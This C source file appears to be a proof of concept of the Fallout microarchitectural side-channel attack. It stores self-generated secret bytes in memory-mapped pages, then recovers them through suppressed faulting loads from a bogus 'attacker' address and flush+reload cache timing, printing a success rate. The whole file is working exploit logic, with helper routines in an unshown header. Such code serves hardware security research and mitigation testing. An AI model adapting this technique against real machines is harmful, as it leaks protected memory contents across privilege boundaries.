#include "fallout.h"

int main(int argc, const char **argv) {
    /* cmdline args options 
    * -d debug info
    * -f fix the secret to "This page has been compromised! you are not safe!"
    */
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-' && argv[i][1] == 'd')
            args |= debug;
        else if (argv[i][0] == '-' && argv[i][1] == 'f')
            args |= fixed;
    }

  	memset(lut, 1, sizeof(lut));

	CACHE_MISS = detect_flush_reload_threshold();
    if (args & debug)
	    printf("Cache miss @ %zd\n", CACHE_MISS);

	// Prepare memory for flush+reload
	for (int i = 0; i < 256; i++) {
		flush(lut + i * PAGE_SIZE);
	}

    // for secret generator
    srand(time(NULL));

    int bytes = 0;

    signal(SIGSEGV, trycatch_segfault_handler);

    char *victim, *last = 0;

    for (int i = 0; i < PAGE_POOL_SIZE; i++) {
        victim = gnrmap();
        if (last) {
            munmap((void *) last, PAGE_SIZE);
            last = 0;
        }
        if (!victim)
            continue;
        if ((args & fixed) == 0)
            gnrsecret();
        fallout(i, victim);
        //counter how many bytes have been successfuly read
        for (int j = 0; j < slen; j++) {
            if (decoded[j] == secret[j])
                ++bytes;
        }
        last = victim;
    }

    signal(SIGSEGV, SIG_DFL);

    printf("successful reads rate: %2.2f%%\n", (bytes > 0) ? (double) (bytes) / (slen * PAGE_POOL_SIZE) * 100 : 0);
    if (last)
        munmap((void *) last, PAGE_SIZE);
	return (0);
}

// we want to make sure the page file is backed up by real storage
void *gnrmap() {
    static int ind = 0;
    int fd;
	if ((fd = open(gnrname(ind++), O_RDWR | O_CREAT | O_TRUNC, 0644)) < 0) {
		fprintf(stderr, "gnrmap: open failed\n");
		return 0;
	}
	static char buf[PAGE_SIZE];
	if (write(fd, buf, PAGE_SIZE) != PAGE_SIZE) {
		close(fd);
		fprintf(stderr, "gnrmap: write failed\n");
		return 0;
    }
    char *page = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
    if (fd)
        close(fd);
    if (page == MAP_FAILED) {
    	fprintf(stderr, "gnrmap: mmap failed: %s\n", strerror(errno));
    	return 0;
	}
    return page;
}

char *gnrname(int namei) {
    static char name[21] = PAGE_NAME;
    snprintf(name + 16, 5, "%d", namei);
    if (args & debug)
        printf("victim file name: %s\n", name);
    return name;
}

void gnrsecret() {
    slen = rand() % (SECRET_MAX_LEN - SECRET_MIN_LEN) + SECRET_MIN_LEN;
    for (int i = 0; i < slen; i++) {
        secret[i] = rand() % 127 + 1; // 1 <= char <= 127
    }
    secret[slen] = 0;
}

void fallout(int pagenum, char *victim) {
    static char *attacker = (char *) 0x9876543214321000ull;
    static char hist[256];
    int success = 0;
    for (int i = 0; i < slen; i++) {
        memset(hist, 0, 256);
        for (int r = 0; r < RETRIES; r++) {
            mfence();
            victim[(i + 1) * OFFSET] = secret[i];
            if (!setjmp(trycatch_buf)) {
                maccess(lut + attacker[(i + 1) * OFFSET] * PAGE_SIZE);
            }
            for (int b = 1; b < 256; b++) {
                if (flush_reload(lut + b * PAGE_SIZE)) {
                    ++hist[b];
                    if (!success)
                        success = 1;
                }
            }
        }
        if (args & debug)
            printf("PAGE#%d at [%03d] string index: [%02d] ",pagenum, (i + 1) * OFFSET, i);
        unsigned char best = 0;
        if (success) {
            for (int j = 1; success && j < 256; j++) {
                if (hist[best] < hist[j])
                    best = j;
            }
            if (args & debug)
                printf("best guess: 0x%02x = %c\n", best, best);
            success = 0;
        } else if (args & debug) {
                printf("FAILURE\n");
        }
        decoded[i] = best;
    }
}